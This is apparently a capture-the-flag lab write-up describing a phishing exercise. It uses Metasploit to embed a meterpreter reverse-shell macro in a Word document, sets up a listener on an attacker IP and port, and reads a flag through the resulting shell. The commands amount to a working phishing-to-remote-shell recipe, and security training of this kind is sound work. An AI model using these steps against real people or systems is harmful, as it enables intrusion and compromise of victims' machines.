Today we learn about phishing attacks. We learn to create a document with a malicious macro and use that for a phishing attack.

Firstly our job is to create the document with the malicious macro. We do this by using the metasploit framework. We run the following commands in order:
+ `set payload windows/meterpreter/reverse_tcp` specifies the payload we are going to use.
+ `use exploit/multi/fileformat/office_word_macro` specifies the exploit we are going to use.
+ `set LHOST 10.10.118.252` specifies the ip of the attacker's system
+ `set LPORT 8888` specifies the listening port.
+ `exploit` generates the macro and embeds it into the document.

Now we need to listen in for the incoming connections. We can do so by using the metasploit framework again by running the following commands in order:
+ `use multi/handler` which handles incoming connections
+ `set payload windows/meterpreter/reverse_tcp` ensures the payload works with the payload we used while creating the macro.
+ `set LHOST 10.10.118.252` specifies the ip of the attacker's system.
+ `set LPORT 8888` specifies the listening port.
+ `exploit` to extablish a reverse shell.

Now with the credentials provided we send an email to the victim and wait for the reverse shell to start. Once we get back the reverse shell we do `cat flag.txt` to get our flag.

```
meterpreter > cat flag.txt
THM{PHISHING_CHRISTMAS}meterpreter > 
```
